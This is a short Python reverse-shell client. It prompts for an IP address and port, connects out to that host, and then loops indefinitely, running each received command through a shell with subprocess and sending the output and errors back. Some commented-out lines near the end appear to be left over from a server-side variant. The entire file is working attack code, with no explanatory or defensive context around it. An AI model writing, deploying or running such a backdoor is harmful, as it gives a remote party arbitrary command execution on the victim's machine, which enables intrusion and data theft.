import socket
import subprocess
	
SRV_ADDR = input("IP address : ")
SRV_PORT = int(input("Port :"))

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
status = client.connect_ex((SRV_ADDR,SRV_PORT)) 
if status == 0 : 
	print("connection established")
else : 
	print("connection failed")

while 1 :
	print("[-] Awaiting commands...")
	command = client.recv(1024)
	command = command.decode()
	op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
	output = op.stdout.read()
	output_error = op.stderr.read()
	print("[-] Sending response...")
	client.send(output + output_error)
	





	#command = input("Enter command : ")
	#command = command.encode()
	#op = subprocess.Popen(command)
	#output = op.stdout.read()
	#print("sending output")
	#c.send(output)
	#print(output)
